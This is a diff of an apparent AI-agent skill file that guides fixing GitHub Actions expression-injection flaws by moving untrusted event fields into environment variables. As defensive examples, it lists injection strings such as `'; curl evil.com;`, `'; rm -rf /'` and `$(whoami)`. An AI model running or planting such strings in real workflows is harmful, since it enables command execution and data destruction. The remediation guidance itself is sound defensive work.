@@ -3,7 +3,7 @@ name: CodeQL Expression Injector Fixer
 description: Mitigate expression injection vulnerabilities in workflows
 model: haiku
 author: JacobPEvans
-allowed-tools: Read, Edit, Write, Bash(git:*), Bash(gh:*)
+allowed-tools: Read, Edit, Write, Bash(git *), Bash(gh *)
 ---
 
 # CodeQL Expression Injector Fixer
@@ -37,6 +37,7 @@ Fix expression injection vulnerabilities in GitHub Actions workflows by wrapping
 **Vulnerability**: If PR body contains `'; curl evil.com;`, entire command is compromised.
 
 **Dangerous contexts**:
+
 - `github.event.pull_request.body`
 - `github.event.pull_request.title`
 - `github.event.issue.body`
@@ -56,7 +57,8 @@ Fix expression injection vulnerabilities in GitHub Actions workflows by wrapping
   run: curl https://api.example.com -d "$PR_BODY"
 ```
 
-**Why safe**: GitHub masks environment variable values in logs (if they're secrets), and more importantly, the untrusted input is now a string variable, not part of the shell command itself.
+**Why safe**: GitHub masks environment variable values in logs (if they're secrets), and more
+importantly, the untrusted input is now a string variable, not part of the shell command itself.
 
 ## Workflow per Alert
 
@@ -69,6 +71,7 @@ Fix expression injection vulnerabilities in GitHub Actions workflows by wrapping
 ### 2. Identify Dangerous Input
 
 Extract the exact expression:
+
 ```regex
 ${{ github.event.* }}
 ${{ github.head_ref }}
@@ -79,10 +82,11 @@ Document the dangerous context (what field, what event).
 ### 3. Implement Safe Pattern
 
 Create environment variable name from context:
-- `${{ github.event.pull_request.body }}` → `env: PR_BODY`
-- `${{ github.event.pull_request.title }}` → `env: PR_TITLE`
-- `${{ github.event.comment.body }}` → `env: COMMENT_BODY`
-- `${{ github.head_ref }}` → `env: HEAD_REF`
+
+- `${{ github.event.pull_request.body }}` -> `env: PR_BODY`
+- `${{ github.event.pull_request.title }}` -> `env: PR_TITLE`
+- `${{ github.event.comment.body }}` -> `env: COMMENT_BODY`
+- `${{ github.head_ref }}` -> `env: HEAD_REF`
 
 Rewrite step:
 
@@ -101,17 +105,19 @@ Rewrite step:
 ### 4. Verify Safe Escaping
 
 Test with malicious inputs mentally:
-- `'; rm -rf /'` → Treated as literal string value, safe
-- `$(whoami)` → No command substitution occurs, safe
-- `` ` command ` `` → No backtick execution, safe
-- `|` or `&&` → Treated as literal, safe
+
+- `'; rm -rf /'` -> Treated as literal string value, safe
+- `$(whoami)` -> No command substitution occurs, safe
+- `` ` command ` `` -> No backtick execution, safe
+- `|` or `&&` -> Treated as literal, safe
 
 ### 5. Add Security Comment
 
 ```yaml
 - name: Process PR
   # SECURITY: PR body is untrusted user input. Wrap in env var to prevent
-  # expression injection. See: https://github.blog/security/vulnerability-research/how-to-catch-github-actions-workflow-injections-before-attackers-do/
+  # expression injection. See:
+  # https://github.blog/security/vulnerability-research/how-to-catch-github-actions-workflow-injections-before-attackers-do/
   env:
     PR_BODY: ${{ github.event.pull_request.body }}
   run: curl https://api.example.com -d "$PR_BODY"
